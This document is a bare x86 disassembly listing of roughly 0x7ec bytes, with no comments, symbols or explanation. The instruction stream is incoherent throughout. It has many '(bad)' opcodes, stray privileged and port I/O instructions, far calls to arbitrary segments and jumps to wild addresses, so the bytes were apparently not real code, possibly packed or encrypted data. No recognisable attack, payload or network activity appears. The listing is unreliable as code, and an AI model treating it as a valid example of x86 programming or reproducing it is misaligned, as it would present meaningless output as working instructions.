  414e92:	pop    esp
  414e93:	cwde   
  414e94:	dec    edi
  414e95:	into   
  414e96:	scas   al,BYTE PTR es:[edi]
  414e97:	pop    edi
  414e98:	retf   0x9815
  414e9b:	(bad)  
  414e9c:	inc    esp
  414e9d:	das    
  414e9e:	leave  
  414e9f:	push   esi
  414ea0:	mov    edx,?
  414ea2:	shr    DWORD PTR [eax],1
  414ea4:	xchg   ebp,eax
  414ea5:	in     al,0xa7
  414ea7:	push   esi
  414ea8:	and    esp,edi
  414eaa:	cmp    ah,bl
  414eac:	cmp    eax,0x485c6fdd
  414eb1:	jge    0x414e6b
  414eb3:	push   edi
  414eb4:	fwait
  414eb5:	xor    eax,0x10306ee2
  414eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ebb:	int3   
  414ebc:	add    BYTE PTR [edi+ebp*2-0x1d],cl
  414ec0:	dec    ebx
  414ec1:	jae    0x414ea3
  414ec3:	mov    cl,0xe0
  414ec5:	shr    BYTE PTR ss:[ebx],0x32
  414ec9:	sub    ebx,edx
  414ecb:	dec    ebp
  414ecc:	inc    eax
  414ecd:	sub    DWORD PTR [esi+0x693b7f3f],0x2832d98
  414ed7:	and    bl,ch
  414ed9:	push   eax
  414eda:	dec    edx
  414edb:	rcr    DWORD PTR [esi-0xb],cl
  414ede:	and    edi,esi
  414ee0:	mov    cl,0x9c
  414ee2:	fmulp  st(0),st
  414ee4:	pusha  
  414ee5:	mov    ecx,0x6b1370d6
  414eea:	xor    al,ah
  414eec:	inc    esp
  414eed:	dec    ebp
  414eee:	test   BYTE PTR [ebx],0x9b
  414ef1:	pushf  
  414ef2:	xor    eax,0x3863000a
  414ef7:	(bad)  
  414ef8:	retf   
  414ef9:	push   eax
  414efa:	dec    edx
  414efb:	xchg   DWORD PTR [edx],ebp
  414efd:	les    edi,FWORD PTR [edi]
  414eff:	mov    bl,0xd2
  414f01:	rol    ah,1
  414f03:	jo     0x414ecf
  414f05:	cwde   
  414f06:	mov    edx,0x7070db08
  414f0b:	ss fs (bad) 
  414f0e:	fisub  DWORD PTR [ebx]
  414f10:	push   ebp
  414f11:	out    dx,al
  414f12:	stos   DWORD PTR es:[edi],eax
  414f13:	sbb    DWORD PTR [eax+0x59],0x36
  414f17:	mov    esi,0x511e9747
  414f1c:	and    BYTE PTR [ebx],0x88
  414f1f:	retf   0xf532
  414f22:	jne    0x414f54
  414f24:	add    al,0x20
  414f26:	ret    0xd0d0
  414f29:	and    DWORD PTR [esi],ebp
  414f2b:	dec    eax
  414f2c:	sub    BYTE PTR [esp+ecx*4-0x283e495b],bh
  414f33:	dec    eax
  414f34:	xchg   ebx,eax
  414f35:	icebp  
  414f36:	sbb    al,0xa9
  414f38:	mov    cl,0xff
  414f3a:	push   ecx
  414f3b:	jae    0x414f71
  414f3d:	sbb    edx,DWORD PTR [ebp+edx*4-0x28]
  414f41:	mov    esp,?
  414f43:	dec    edx
  414f44:	retf   
  414f45:	fs test eax,0x250ec547
  414f4b:	dec    ebp
  414f4c:	aam    0x27
  414f4e:	jp     0x414f04
  414f50:	inc    esi
  414f51:	test   BYTE PTR [esi],al
  414f53:	mov    esp,0xe699e4e9
  414f58:	cmp    al,0x9c
  414f5a:	jmp    0x414f92
  414f5c:	pop    ebx
  414f5d:	xchg   ecx,eax
  414f5e:	js     0x414fbf
  414f60:	js     0x414f4c
  414f62:	rcr    BYTE PTR [eax-0x53],cl
  414f65:	adc    ebx,DWORD PTR [eax+ebp*1+0x6]
  414f69:	sub    eax,0xbb91c434
  414f6e:	mov    edi,0xd502cd9b
  414f73:	outs   dx,DWORD PTR ds:[esi]
  414f74:	inc    ecx
  414f75:	dec    ecx
  414f76:	retf   
  414f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f78:	into   
  414f79:	pop    ecx
  414f7a:	inc    edx
  414f7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f7c:	pop    ebx
  414f7d:	sbb    al,0x28
  414f7f:	mov    ebp,0x75970e0a
  414f84:	adc    al,0xdb
  414f86:	jge    0x414ffc
  414f88:	add    DWORD PTR [edi-0x4b],edi
  414f8b:	mov    ds:0xe4bd812d,al
  414f90:	imul   edx,DWORD PTR [ebp+0x38],0x62038f8
  414f97:	jo     0x414ff9
  414f99:	and    DWORD PTR [ebx+0x60737cba],0x67a4d769
  414fa3:	push   eax
  414fa4:	xor    BYTE PTR [ecx],dl
  414fa6:	xor    eax,0x578d6006
  414fab:	inc    ecx
  414fac:	push   esi
  414fad:	jmp    0x414ff8
  414faf:	add    DWORD PTR [edx],0x20
  414fb2:	cmp    eax,0x78851f03
  414fb7:	add    al,0x82
  414fb9:	inc    edx
  414fba:	push   ss
  414fbb:	mov    ch,0x27
  414fbd:	and    ch,ch
  414fbf:	push   esi
  414fc0:	outs   dx,DWORD PTR ds:[esi]
  414fc1:	(bad)  
  414fc2:	loope  0x414fdf
  414fc4:	std    
  414fc5:	imul   BYTE PTR [eax]
  414fc7:	ret    0xd9b3
  414fca:	data16 arpl ax,di
  414fcd:	inc    eax
  414fce:	dec    ecx
  414fcf:	xchg   esp,eax
  414fd0:	push   ebp
  414fd1:	ja     0x414fa0
  414fd3:	xor    ebx,DWORD PTR [edi]
  414fd5:	jns    0x415025
  414fd7:	call   FWORD PTR fs:[ebp+0xa]
  414fdb:	fild   WORD PTR [esp+eiz*2-0x1d]
  414fdf:	shl    bl,cl
  414fe1:	sahf   
  414fe2:	arpl   bx,di
  414fe4:	and    DWORD PTR [ecx-0x3aca1537],esi
  414fea:	(bad)  
  414feb:	push   ebp
  414fec:	ins    DWORD PTR es:[edi],dx
  414fed:	lahf   
  414fee:	shr    BYTE PTR [esi+0x66a0cf30],cl
  414ff4:	pop    ebp
  414ff5:	add    BYTE PTR [edi+0x4a],cl
  414ff8:	nop
  414ff9:	ficomp DWORD PTR ds:0x67e1854b
  414fff:	nop
  415000:	stos   BYTE PTR es:[edi],al
  415001:	jmp    0x190c7ab7
  415006:	add    eax,0xe94739bb
  41500b:	cli    
  41500c:	xchg   bh,al
  41500e:	sub    DWORD PTR [eax],ebp
  415010:	neg    DWORD PTR [ecx+eiz*8-0x37]
  415014:	jno    0x414fb8
  415016:	lods   al,BYTE PTR ds:[esi]
  415017:	(bad)  
  415018:	mov    eax,ds:0x60fcdb21
  41501e:	ss dec ecx
  415020:	jmp    0xc0ee98ed
  415025:	or     al,0xdd
  415027:	dec    ecx
  415028:	xor    eax,0x948ddbf9
  41502d:	dec    ebx
  41502e:	cmp    ecx,DWORD PTR [esi+0x2c24c7ee]
  415034:	mov    edx,0x1becb164
  415039:	inc    edx
  41503a:	inc    edx
  41503b:	and    bh,al
  41503d:	retf   0x6a12
  415040:	sbb    BYTE PTR [eax],dl
  415042:	jecxz  0x41503c
  415044:	adc    al,BYTE PTR [edx+0x23816716]
  41504a:	test   BYTE PTR [eax+0x2c],ch
  41504d:	add    eax,0xf2a53569
  415052:	push   edx
  415053:	stc    
  415054:	mov    al,ds:0xe288628d
  415059:	imul   edi,DWORD PTR [esi+0x4e25f939],0xda26782c
  415063:	scas   al,BYTE PTR es:[edi]
  415064:	shl    BYTE PTR [edi+ecx*8],0xf6
  415068:	adc    edx,edx
  41506a:	inc    eax
  41506b:	mov    ah,0x2b
  41506d:	push   ecx
  41506e:	ret    
  41506f:	mov    ds:0x4380874a,al
  415074:	sar    BYTE PTR [esi+0x34],0xc5
  415078:	dec    edi
  415079:	jl     0x415009
  41507b:	xchg   esp,eax
  41507c:	fwait
  41507d:	mov    cl,0x19
  41507f:	cmp    esi,DWORD PTR [ebp+0x1c]
  415082:	out    dx,al
  415083:	jnp    0x4150c0
  415085:	retf   0xc851
  415088:	ja     0x4150cb
  41508a:	adc    BYTE PTR [edx+0x5aef1b7a],cl
  415090:	jecxz  0x415070
  415092:	xchg   ecx,eax
  415093:	cmc    
  415094:	jmp    0x415051
  415096:	fisttp WORD PTR [eax]
  415098:	popf   
  415099:	and    al,0x50
  41509b:	repnz inc edi
  41509d:	fwait
  41509e:	ja     0x4150e5
  4150a0:	sbb    esp,DWORD PTR [esi-0x1e89ab2e]
  4150a6:	mov    edi,0x9280decb
  4150ab:	mov    esp,0xa0d8c77b
  4150b0:	call   0xe928:0x64f81a98
  4150b7:	xor    al,0x9d
  4150b9:	pop    edi
  4150ba:	jp     0x4150a3
  4150bc:	int3   
  4150bd:	mov    gs,WORD PTR [ebx]
  4150bf:	dec    ebx
  4150c0:	jnp    0x4150eb
  4150c2:	sbb    bl,BYTE PTR [ebx-0x1ee94d0b]
  4150c8:	inc    ecx
  4150c9:	gs inc ecx
  4150cb:	fld    TBYTE PTR [ebp-0x45051264]
  4150d1:	or     al,0x69
  4150d3:	int    0x28
  4150d5:	dec    ebp
  4150d6:	cmp    al,0xc8
  4150d8:	xchg   esp,eax
  4150d9:	mov    al,ch
  4150db:	push   esp
  4150dc:	jmp    0x709251c9
  4150e1:	or     edx,DWORD PTR [ecx+0x26]
  4150e4:	pop    edx
  4150e5:	dec    edx
  4150e6:	cmp    ecx,ebp
  4150e8:	push   esi
  4150e9:	jnp    0x415075
  4150eb:	sub    edx,DWORD PTR [ecx-0x560396a4]
  4150f1:	add    cl,BYTE PTR [edx]
  4150f3:	mov    esi,0x1eac7614
  4150f8:	mov    dh,BYTE PTR [ebx-0x3b]
  4150fb:	dec    esi
  4150fc:	je     0x415178
  4150fe:	xchg   edx,eax
  4150ff:	(bad)  
  415100:	and    eax,0x88569dc9
  415105:	ja     0x4150c9
  415107:	enter  0x3152,0xb7
  41510b:	fild   WORD PTR [esi]
  41510d:	push   es
  41510e:	push   eax
  41510f:	mov    edx,0x877d1cff
  415114:	cli    
  415115:	pop    edx
  415116:	daa    
  415117:	mov    fs,esi
  415119:	add    al,0x5c
  41511b:	xchg   ebp,ebp
  41511d:	and    DWORD PTR [ecx],ebx
  41511f:	fistp  DWORD PTR [ebp+0x70]
  415122:	xor    al,0x17
  415124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415125:	dec    eax
  415126:	cmp    DWORD PTR [eax+0x7a78818e],0xb8dde9a2
  415130:	icebp  
  415131:	hlt    
  415132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415133:	stos   DWORD PTR es:[edi],eax
  415134:	imul   edx,DWORD PTR [ebp-0x35],0xc1682258
  41513b:	outs   dx,BYTE PTR ds:[esi]
  41513c:	cmp    BYTE PTR [eax+0x138ba359],0xdf
  415143:	sahf   
  415144:	fidiv  DWORD PTR [edx-0x7b]
  415147:	jno    0x4151c3
  415149:	mov    dl,0xe0
  41514b:	add    ecx,DWORD PTR [edx]
  41514d:	scas   al,BYTE PTR es:[edi]
  41514e:	sub    bh,al
  415150:	rol    edi,1
  415152:	in     eax,dx
  415153:	or     esp,DWORD PTR [ebp+0x3717dd8f]
  415159:	push   ss
  41515a:	mov    eax,ds:0xc907b4a4
  41515f:	jmp    0x4150f6
  415161:	jmp    0x1dbc:0xda17564e
  415168:	jns    0x4150f5
  41516a:	dec    ebp
  41516b:	pusha  
  41516c:	call   0x41d6:0xd5b1ad15
  415173:	pusha  
  415174:	push   0x6a58b78d
  415179:	push   es
  41517a:	in     al,0x74
  41517c:	stos   BYTE PTR es:[edi],al
  41517d:	inc    ecx
  41517e:	jmp    0x4151ef
  415180:	lods   al,BYTE PTR ds:[esi]
  415181:	adc    al,0xa4
  415183:	jle    0x41517b
  415185:	fs jp  0x415193
  415188:	out    dx,eax
  415189:	loopne 0x415206
  41518b:	fstp   st(0)
  41518d:	lahf   
  41518e:	lahf   
  41518f:	jecxz  0x41519a
  415191:	fimul  WORD PTR [edi+0x5e]
  415194:	neg    DWORD PTR [ebx+0x35757201]
  41519a:	sbb    ah,BYTE PTR [edi-0x7a]
  41519d:	add    DWORD PTR [ebp-0x4f7fde20],edi
  4151a3:	into   
  4151a4:	lock sub BYTE PTR [edx+0x77],ch
  4151a8:	dec    ebx
  4151a9:	popf   
  4151aa:	mov    bh,0x87
  4151ac:	test   eax,0xfdf52fd2
  4151b1:	cmc    
  4151b2:	xor    DWORD PTR [eax+ebp*4],edx
  4151b5:	dec    DWORD PTR ss:[edi-0x16]
  4151b9:	lahf   
  4151ba:	xchg   DWORD PTR [ebx+ecx*2-0x1d606c46],ebp
  4151c1:	jmp    0x415203
  4151c3:	push   eax
  4151c4:	cmp    bl,BYTE PTR [ecx]
  4151c6:	pusha  
  4151c7:	(bad)  
  4151c8:	ret    0x7c91
  4151cb:	inc    esi
  4151cc:	mov    al,ds:0xcfff6478
  4151d1:	rcr    dh,1
  4151d3:	mov    BYTE PTR [eax+0x15b15aa],bl
  4151d9:	gs push ecx
  4151db:	in     al,0x41
  4151dd:	nop
  4151de:	int3   
  4151df:	mov    al,ds:0xfbaf2a7
  4151e4:	rcr    dh,1
  4151e6:	cmp    al,0x42
  4151e8:	aas    
  4151e9:	and    eax,0x9c37f7d9
  4151ee:	fsubr  DWORD PTR [edi+eax*4+0x52a37960]
  4151f5:	xor    eax,DWORD PTR [ecx]
  4151f7:	(bad)  
  4151f8:	pop    ebx
  4151f9:	or     dl,BYTE PTR [edi]
  4151fb:	cmp    BYTE PTR [edx],0x40
  4151fe:	pmovmskb ebx,mm6
  415201:	js     0x415236
  415203:	adc    bl,bl
  415205:	mov    bl,0x67
  415207:	jns    0x41523e
  415209:	stc    
  41520a:	scas   al,BYTE PTR es:[edi]
  41520b:	(bad)  
  41520c:	jg     0x41518e
  41520e:	mov    dh,0x3c
  415210:	add    BYTE PTR [ebp+0x297ca2],0x42
  415217:	inc    ebp
  415218:	sub    BYTE PTR es:[eax-0x7992eb1e],ch
  41521f:	sbb    BYTE PTR [eax-0x45],0xe3
  415223:	pop    eax
  415224:	push   ebp
  415225:	imul   eax,DWORD PTR ds:0x130beb81,0x50
  41522c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41522d:	cld    
  41522e:	out    dx,al
  41522f:	push   edx
  415230:	pop    ebx
  415231:	into   
  415232:	sahf   
  415233:	dec    BYTE PTR [eax+0x1d]
  415236:	push   eax
  415237:	cld    
  415238:	inc    edx
  415239:	test   DWORD PTR [edi],0x44b57ac6
  41523f:	leave  
  415240:	shr    BYTE PTR [ecx-0x46efc6d4],1
  415246:	(bad)  
  415247:	xor    ecx,ebx
  415249:	jmp    0x21a8:0x8a410584
  415250:	cmp    BYTE PTR [edx-0x34],0x6b
  415254:	mov    ah,0x85
  415256:	es cmp al,0x2d
  415259:	adc    eax,0x1c09d3ac
  41525e:	inc    ebp
  41525f:	sbb    eax,0x9be2e83d
  415264:	dec    ebp
  415265:	push   esi
  415266:	xor    BYTE PTR [edx+eax*8+0x2fe923c9],dl
  41526d:	pop    eax
  41526e:	sbb    DWORD PTR [esi-0x94c71d3],edi
  415274:	mov    DWORD PTR [edx+0x50252c34],0x36c3cb46
  41527e:	dec    esi
  41527f:	and    DWORD PTR [esi-0x66],edi
  415282:	push   0xd75bfaed
  415287:	xchg   esp,eax
  415288:	mov    eax,0x17f0094
  41528d:	retf   
  41528e:	mov    dl,al
  415290:	(bad)  
  415292:	lods   al,BYTE PTR ds:[esi]
  415293:	fimul  WORD PTR [edi]
  415295:	or     ebp,DWORD PTR [edi]
  415297:	das    
  415298:	xchg   BYTE PTR [ecx+0x5c33e3a5],bh
  41529e:	icebp  
  41529f:	std    
  4152a0:	mov    gs,WORD PTR [ecx]
  4152a2:	adc    bh,al
  4152a4:	mov    edi,0x928039b4
  4152a9:	mov    edi,0x187ddacb
  4152ae:	daa    
  4152af:	cmp    al,0xa6
  4152b1:	inc    ebx
  4152b2:	arpl   si,sp
  4152b4:	cwde   
  4152b5:	dec    ecx
  4152b6:	push   0xffffffa0
  4152b8:	call   0x8ead:0x82b82c4c
  4152bf:	out    dx,eax
  4152c0:	push   ax
  4152c2:	pop    eax
  4152c3:	dec    edx
  4152c4:	pop    eax
  4152c5:	ret    
  4152c6:	sahf   
  4152c7:	mov    ecx,0x9882f9a0
  4152cc:	aas    
  4152cd:	xchg   edx,eax
  4152ce:	in     eax,0xbd
  4152d0:	sub    esp,esi
  4152d2:	mov    ah,0xa8
  4152d4:	mov    dl,0x8e
  4152d6:	pop    esi
  4152d7:	pop    eax
  4152d8:	dec    ebx
  4152d9:	sub    cl,bh
  4152db:	lea    ecx,[eax-0x7cd19432]
  4152e1:	jmp    0x415302
  4152e3:	out    dx,al
  4152e4:	dec    esp
  4152e5:	or     al,0x4d
  4152e7:	or     DWORD PTR [eax+esi*8+0x5d5c7ae7],esi
  4152ee:	mov    eax,ds
  4152f0:	pop    edi
  4152f1:	push   edi
  4152f2:	mov    edi,0x88556d48
  4152f7:	fs and al,0xf3
  4152fa:	adc    DWORD PTR [eax],0xffffffdb
  4152fd:	xchg   edi,eax
  4152fe:	(bad)  
  4152ff:	jae    0x4152d9
  415301:	xchg   ebp,eax
  415302:	sub    BYTE PTR [edx+eiz*4+0x15bc36ba],bl
  415309:	sbb    edx,DWORD PTR [esi-0x29ec2c6a]
  41530f:	cld    
  415310:	sbb    DWORD PTR [edx-0x13adef8d],ebp
  415316:	jo     0x415359
  415318:	adc    DWORD PTR [edi-0x61],ebp
  41531b:	mov    bh,0xc6
  41531d:	adc    al,0xc9
  41531f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415320:	xchg   BYTE PTR [eax],ah
  415322:	fdiv   DWORD PTR [ebp-0x6e81a22b]
  415328:	pop    ebx
  415329:	mov    bl,0xfd
  41532b:	test   DWORD PTR [edx],ebp
  41532d:	addr16 dec edi
  41532f:	sbb    ah,BYTE PTR [esi-0x2d]
  415332:	jl     0x415339
  415334:	dec    ecx
  415335:	sbb    BYTE PTR [edx-0x6750c37e],bl
  41533b:	jne    0x41530d
  41533d:	jne    0x41530f
  41533f:	mov    bh,0x65
  415341:	dec    ecx
  415342:	pop    ds
  415343:	shl    DWORD PTR [ebp+edx*4-0x532788ac],1
  41534a:	aam    0x5e
  41534c:	adc    al,0xf7
  41534e:	call   0x52dfcaeb
  415353:	popa   
  415354:	cmp    al,0x5c
  415356:	out    dx,al
  415357:	addr16 cwde 
  415359:	add    cl,dl
  41535b:	clc    
  41535c:	xchg   ebp,eax
  41535d:	out    0x1c,eax
  41535f:	sbb    bh,BYTE PTR [edi+0x3d]
  415362:	fisub  DWORD PTR [eax-0x66]
  415365:	pop    es
  415366:	mov    ecx,0x43cedfe5
  41536b:	ror    BYTE PTR [ecx-0x6b],0xdb
  41536f:	rcr    DWORD PTR [esi-0x187dbe5e],0x4
  415376:	push   ds
  415377:	add    eax,0xdad21261
  41537c:	xor    cl,dh
  41537e:	ins    DWORD PTR es:[edi],dx
  41537f:	xchg   esi,eax
  415380:	pop    eax
  415381:	or     BYTE PTR [edi],bl
  415383:	inc    ebp
  415384:	inc    esi
  415385:	sub    edx,edi
  415387:	dec    ebx
  415388:	jae    0x415386
  41538a:	jp     0x415409
  41538c:	sub    bl,dh
  41538e:	jnp    0x41540c
  415390:	mov    eax,ds:0x3535d6a2
  415395:	stos   DWORD PTR es:[edi],eax
  415396:	push   0xfffffff9
  415398:	add    eax,0xf27f3e80
  41539d:	jge    0x4153f3
  41539f:	mov    ecx,0x91f3adc6
  4153a4:	jb     0x4153f8
  4153a6:	xor    eax,0xdf9db793
  4153ab:	adc    al,BYTE PTR [edx]
  4153ad:	es inc esi
  4153af:	or     edx,ebx
  4153b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153b2:	aaa    
  4153b3:	aam    0x9a
  4153b5:	xchg   esp,ebx
  4153b7:	sbb    DWORD PTR [edi],eax
  4153b9:	xor    esi,DWORD PTR [esi+0xa77499e]
  4153bf:	inc    edi
  4153c0:	jp     0x4153ab
  4153c2:	stc    
  4153c3:	aas    
  4153c4:	add    DWORD PTR [ebx+esi*1],ecx
  4153c7:	dec    ebx
  4153c8:	sub    eax,0xa2d52c65
  4153cd:	pusha  
  4153ce:	imul   esi,edi,0x96331660
  4153d4:	lods   eax,DWORD PTR ds:[esi]
  4153d5:	push   ebx
  4153d6:	retf   0x5480
  4153d9:	rcl    eax,0xc9
  4153dc:	mov    esp,0x594a428c
  4153e1:	sbb    DWORD PTR [eax-0x4fef9396],ebp
  4153e7:	cmp    eax,ebp
  4153e9:	pop    ds
  4153ea:	sbb    al,BYTE PTR [edi+0x61]
  4153ed:	in     al,dx
  4153ee:	inc    ebx
  4153ef:	js     0x415411
  4153f1:	hlt    
  4153f2:	xchg   esi,eax
  4153f3:	sbb    DWORD PTR [esp+edi*8-0x69],esi
  4153f7:	adc    BYTE PTR [esi],dh
  4153f9:	mov    ecx,0x44b160a1
  4153fe:	cmp    ah,BYTE PTR [edi-0x5e]
  415401:	dec    DWORD PTR [eax-0x71]
  415404:	(bad)  
  415405:	sbb    bh,dh
  415407:	(bad)  
  415408:	rol    DWORD PTR [edi+eax*1-0x4d25d10d],cl
  41540f:	loope  0x4153b1
  415411:	(bad)  
  415412:	adc    DWORD PTR [eax],ecx
  415414:	jnp    0x41539d
  415416:	shl    BYTE PTR [esi-0x56b37b2e],0x88
  41541d:	ins    BYTE PTR es:[edi],dx
  41541e:	adc    esi,DWORD PTR [esi-0x8d70d0a]
  415424:	out    dx,eax
  415425:	lea    ebp,[eax+edx*2+0x49d1cde1]
  41542c:	pop    esp
  41542d:	sbb    al,0x4c
  41542f:	ror    BYTE PTR [eax+edi*4+0x7e],cl
  415433:	clc    
  415434:	int3   
  415435:	sbb    esp,DWORD PTR [edx+ebp*2-0x1]
  415439:	outs   dx,BYTE PTR ds:[esi]
  41543a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41543b:	or     DWORD PTR [ebx-0xe],ecx
  41543e:	push   edi
  41543f:	xor    ecx,DWORD PTR [edi]
  415441:	nop
  415442:	popf   
  415443:	inc    esi
  415444:	pop    edi
  415445:	pop    esi
  415446:	pop    ebx
  415447:	cmp    ecx,0x1d8ba816
  41544d:	xor    edi,DWORD PTR [ebx+0x37]
  415450:	adc    al,0x74
  415452:	xor    al,0xa7
  415454:	daa    
  415455:	xor    al,0xdb
  415457:	icebp  
  415458:	mov    al,0xf
  41545a:	fcom   st(0)
  41545c:	add    al,0xd
  41545e:	repnz imul edi,DWORD PTR [eax+0x53],0x6c
  415463:	xor    eax,0x681ea94e
  415468:	jns    0x4153ef
  41546a:	push   ecx
  41546b:	dec    ecx
  41546c:	push   es
  41546d:	cmp    ecx,eax
  41546f:	push   0xe46d1f7a
  415474:	xchg   esi,eax
  415475:	adc    eax,0xefbc183d
  41547a:	test   al,0xbb
  41547c:	cli    
  41547d:	xchg   esp,eax
  41547e:	das    
  41547f:	stos   DWORD PTR es:[edi],eax
  415480:	jl     0x4154ac
  415482:	jno    0x415446
  415484:	nop
  415485:	popa   
  415486:	cmp    DWORD PTR [esi+edx*2],0x7f74a2b
  41548d:	xor    dh,dh
  41548f:	jl     0x4154f4
  415491:	jae    0x41541a
  415493:	push   ebx
  415494:	jo     0x4154b7
  415496:	test   DWORD PTR ss:[edx+0x15],ebp
  41549a:	xor    eax,0x93484298
  41549f:	dec    ecx
  4154a0:	mov    bl,0x7e
  4154a2:	sub    bh,BYTE PTR [ecx]
  4154a4:	xlat   BYTE PTR ds:[ebx]
  4154a5:	lods   al,BYTE PTR ds:[esi]
  4154a6:	adc    esp,DWORD PTR [ebx+0x4948f3b4]
  4154ac:	mov    esi,0xa6834b53
  4154b1:	xor    DWORD PTR ds:0x847c,edi
  4154b6:	jo     0x4154b8
  4154b8:	add    ebx,DWORD PTR [edi]
  4154ba:	pop    edx
  4154bb:	aam    0xca
  4154bd:	addr16 mov bl,0x56
  4154c0:	pop    eax
  4154c1:	dec    ecx
  4154c2:	mov    ebp,0x77201621
  4154c7:	ret    0x2611
  4154ca:	jno    0x415466
  4154cc:	outs   dx,BYTE PTR ds:[esi]
  4154cd:	outs   dx,BYTE PTR ds:[esi]
  4154ce:	add    eax,0x76c57e12
  4154d3:	mov    al,0xbc
  4154d5:	mov    cl,0xd7
  4154d7:	aad    0x54
  4154d9:	sahf   
  4154da:	daa    
  4154db:	inc    ecx
  4154dc:	cmp    ecx,DWORD PTR ds:0x598bc3c7
  4154e2:	es jae 0x415558
  4154e5:	mov    BYTE PTR [ebp-0x2b0a0744],bl
  4154eb:	mov    ebx,0x742099e9
  4154f0:	pop    esp
  4154f1:	adc    DWORD PTR [eax+0x46eaab51],ebx
  4154f7:	and    esp,DWORD PTR [edx-0x31729ac4]
  4154fd:	adc    cl,BYTE PTR ds:0x66fd863a
  415503:	les    esi,FWORD PTR [ebp-0x5c7a7711]
  415509:	xor    ah,BYTE PTR [ebx]
  41550b:	xor    BYTE PTR [edi],bh
  41550d:	xor    esi,ecx
  41550f:	xor    eax,0x6a298ee9
  415514:	or     eax,0xec4bcbc
  415519:	xchg   edi,eax
  41551a:	fld    DWORD PTR [esi+0x27c9143f]
  415520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415521:	lods   eax,DWORD PTR ds:[esi]
  415522:	jmp    0x2d769d1f
  415527:	loop   0x415529
  415529:	repnz sub BYTE PTR [esi],bl
  41552c:	imul   edi,DWORD PTR [ecx],0x30
  41552f:	mov    eax,0x63e00cb1
  415534:	cs (bad) 
  415536:	xchg   si,ax
  415538:	adc    eax,0xd537ea7b
  41553d:	mov    al,0x43
  41553f:	push   edi
  415540:	scas   eax,DWORD PTR es:[edi]
  415541:	aas    
  415542:	jne    0x41551a
  415544:	scas   eax,DWORD PTR es:[edi]
  415545:	nop
  415546:	add    bl,BYTE PTR [eax-0x13553498]
  41554c:	pop    ebp
  41554d:	or     cl,ch
  41554f:	mov    ebx,0x2107a854
  415554:	std    
  415555:	xchg   ebx,eax
  415556:	fsub   DWORD PTR [esi+0x46be62ea]
  41555c:	sbb    DWORD PTR [ebp+0x3e75dfe0],ecx
  415562:	lds    ebx,FWORD PTR [ebx]
  415564:	daa    
  415565:	jno    0x415500
  415567:	push   ebp
  415568:	inc    ebx
  415569:	aas    
  41556a:	pop    ds
  41556b:	call   0x538c:0x74cab9da
  415572:	push   edx
  415573:	dec    ecx
  415574:	out    dx,al
  415575:	inc    ebp
  415576:	mov    ds:0xf0aee8e2,al
  41557b:	shl    DWORD PTR [edx],0x68
  41557e:	or     cl,BYTE PTR [eax+0xd]
  415581:	hlt    
  415582:	mov    al,0x7c
  415584:	jmp    0x415508
  415586:	cs addr16 push edx
  415589:	sub    edi,DWORD PTR [ecx+ebx*1-0x182d457c]
  415590:	leave  
  415591:	mov    ebp,0x61503255
  415596:	repnz test DWORD PTR [eax-0x112cad45],ebx
  41559d:	int3   
  41559e:	and    eax,0xa8fa308e
  4155a3:	scas   al,BYTE PTR es:[edi]
  4155a4:	out    dx,al
  4155a5:	sbb    al,0x9a
  4155a7:	in     al,dx
  4155a8:	or     DWORD PTR [si-0x46],ebx
  4155ac:	aas    
  4155ad:	popa   
  4155ae:	in     al,dx
  4155af:	pop    edi
  4155b0:	test   BYTE PTR [esi+0x338f116d],bl
  4155b6:	and    eax,0xb41c351b
  4155bb:	aaa    
  4155bc:	leave  
  4155bd:	xor    al,BYTE PTR [ecx+0x76f2c9a2]
  4155c3:	mov    esi,0x8c480d3e
  4155c8:	jmp    0xedc513e1
  4155cd:	sbb    eax,0xea5085bb
  4155d2:	mov    dl,0x48
  4155d4:	ss add eax,0x4370d20a
  4155da:	and    esp,edx
  4155dc:	dec    ebx
  4155dd:	hlt    
  4155de:	call   0x3a7d6b16
  4155e3:	ins    DWORD PTR es:[edi],dx
  4155e4:	add    BYTE PTR [edx-0x55],cl
  4155e7:	cmp    ebx,0x9cd98ce3
  4155ed:	add    esp,DWORD PTR [eax-0x63]
  4155f0:	mov    ah,BYTE PTR [edi]
  4155f2:	dec    esi
  4155f3:	aaa    
  4155f4:	iret   
  4155f5:	jb     0x415613
  4155f7:	jmp    0x3541:0x2600e93e
  4155fe:	cmp    eax,0x86412aae
  415603:	xor    ch,BYTE PTR [esi+0x4ddc1aa0]
  415609:	sbb    ah,BYTE PTR [ebx+0x78]
  41560c:	(bad)  
  41560d:	xor    BYTE PTR [eax+0x17],bl
  415610:	sbb    dh,BYTE PTR [esi-0x1e]
  415613:	inc    eax
  415614:	outs   dx,BYTE PTR ds:[esi]
  415615:	in     eax,0x11
  415617:	les    eax,FWORD PTR [edx]
  415619:	loopne 0x4155d8
  41561b:	pushf  
  41561c:	lock jmp 0x63554b82
  415622:	mov    ebp,0x9e6b53c
  415627:	sbb    bh,al
  415629:	lea    ebp,[ecx]
  41562b:	fidiv  WORD PTR [edi-0x9]
  41562e:	mov    ebp,0xb3df0263
  415633:	test   BYTE PTR [ebx-0x68078927],bl
  415639:	les    eax,FWORD PTR [eax]
  41563b:	cmp    BYTE PTR [ecx+ebp*4+0x5b78e58],0xcb
  415643:	inc    edx
  415644:	xor    bl,BYTE PTR [esi-0x1d85eed9]
  41564a:	pop    esi
  41564b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41564c:	mov    al,0x95
  41564e:	dec    bh
  415650:	lods   al,BYTE PTR ds:[esi]
  415651:	popa   
  415652:	sbb    al,0xee
  415654:	cvtps2pd xmm5,QWORD PTR [edx+0x78]
  415658:	fsub   DWORD PTR [ecx+0x1]
  41565b:	push   es
  41565c:	adc    DWORD PTR [ecx],edi
  41565e:	push   ds
  41565f:	(bad)  
  415660:	mov    ebx,0x59a94e95
  415665:	pop    edi
  415666:	call   0xb1c1:0xe1a8f19e
  41566d:	retf   0x4a1
  415670:	xor    BYTE PTR [edx-0x7db587c6],cl
  415676:	dec    esp
  415677:	test   ah,ch
  415679:	retf   0xe22a
  41567c:	push   edi
  41567d:	dec    ebp
